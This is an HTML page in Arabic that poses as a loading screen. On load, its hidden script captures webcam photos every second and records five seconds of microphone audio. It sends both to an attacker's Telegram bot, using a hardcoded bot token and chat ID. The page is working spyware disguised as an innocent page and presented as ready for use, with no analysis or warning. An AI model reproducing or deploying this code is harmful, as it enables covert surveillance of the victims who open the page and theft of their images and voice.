<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>جاري التحميل...</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      height: 100vh;
      width: 100vw;
      overflow: hidden;
      touch-action: none;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: #fff;
      text-align: center;
    }

    .loader {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #ffeb3b;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .text {
      font-size: 1.5em;
      padding: 0 20px;
    }

    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <div class="loader"></div>
  <div class="text">جاري التحميل...</div>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <script>
    const botToken = '7760418315:AAGBJWUpehCKyxFR12gtzpQVM2KEgsyt4qk';
    const chatId = '6514749116';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    // ✅ تصوير الكاميرا كل ثانية
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          setInterval(async () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg');
            sendPhoto(imageData);
          }, 1000);
        };
      } catch (err) {
        console.error("فشل تشغيل الكاميرا:", err);
      }
    }

    async function sendPhoto(dataUrl) {
      try {
        const blob = await fetch(dataUrl).then(res => res.blob());
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'photo.jpg');

        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      } catch (err) {
        console.error("فشل إرسال الصورة:", err);
      }
    }

    // ✅ تسجيل صوت لمدة 5 ثواني
    async function recordAudioAndSend() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const audioChunks = [];

        mediaRecorder.ondataavailable = e => {
          audioChunks.push(e.data);
        };

        mediaRecorder.onstop = async () => {
          const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
          const formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('voice', audioBlob, 'audio.ogg');

          await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
            method: 'POST',
            body: formData
          });
        };

        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000); // تسجيل 5 ثواني
      } catch (err) {
        console.error("فشل تسجيل الصوت:", err);
      }
    }

    // ✅ بدء الكاميرا والصوت معًا
    startCamera();
    recordAudioAndSend();
  </script>
</body>
</html>
